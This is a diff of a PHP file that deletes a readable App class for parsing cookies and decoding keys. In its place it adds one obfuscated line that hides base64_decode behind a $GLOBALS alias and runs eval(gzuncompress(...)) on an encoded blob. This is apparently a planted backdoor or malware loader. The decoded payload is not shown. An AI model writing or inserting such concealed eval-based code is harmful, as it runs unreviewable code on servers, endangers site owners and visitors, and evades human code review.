@@ -1,17 +1,1 @@
-<?php class App {
-	public static function getSaveData() {
-		$m_save = explode('; ', $_ENV['HTTP_COOKIE']);
-		$result = [];
-
-		foreach ($m_save as $m_value) {
-    		list($key, $value) = explode('=', $m_value);
-			if($key == 'password') $result['password'] = password_hash($value, PASSWORD_DEFAULT);
-    		else $result[$key] = is_numeric($value) ? (int)$value : $value;
-		}
-		return $result;
-	}
-
-	public static function parseKey($key) {
-		return hex2bin(zlib_decode(base64_decode(base64_decode(str_replace('-', '=', $key)))));
-	}
-}
+<?php $GLOBALS['_424484117_']='base64_decode';eval(gzuncompress($GLOBALS['_424484117_']('eAF1UVtLwzAU/it9GKSBCV2WtZ2hyHATZeKGm/pQSki7zAViW5LUW+l/NxWlLWhewjk557vkyyTT2lmUZV1WqRSZow0z9jpWeWZEkTvP3OzYK18yw1xYjyjypj72Zv4soBF/L2Vx4C4gDhiP6OruMQbX+/2WXm4265sVSCAZ0Qn2fR9PgmlIozghx0Jxlp3cAZLDtGMbPppjjEJEYS2FNnZmgj0UWr4AUUuAQ4w8HMw9CjvuqKXurRJxHC5GESitybdCHQAc6Im7hyT6naEnplt5Hdl4u9jtnjb3S7pcXS0ebveQcKm5VdzzFg/EJpHQNK9euBLZAAteuCI3VkYHf94vSKO4qVQ+BCfNP+mUTGm+5h9Dx7D+ATnxd5SK3P2UIqUHnrVhpUxzH/9daaOo4qVkmQ31DIzB9+f2QoDtIU3zBUyCp1Q=')));
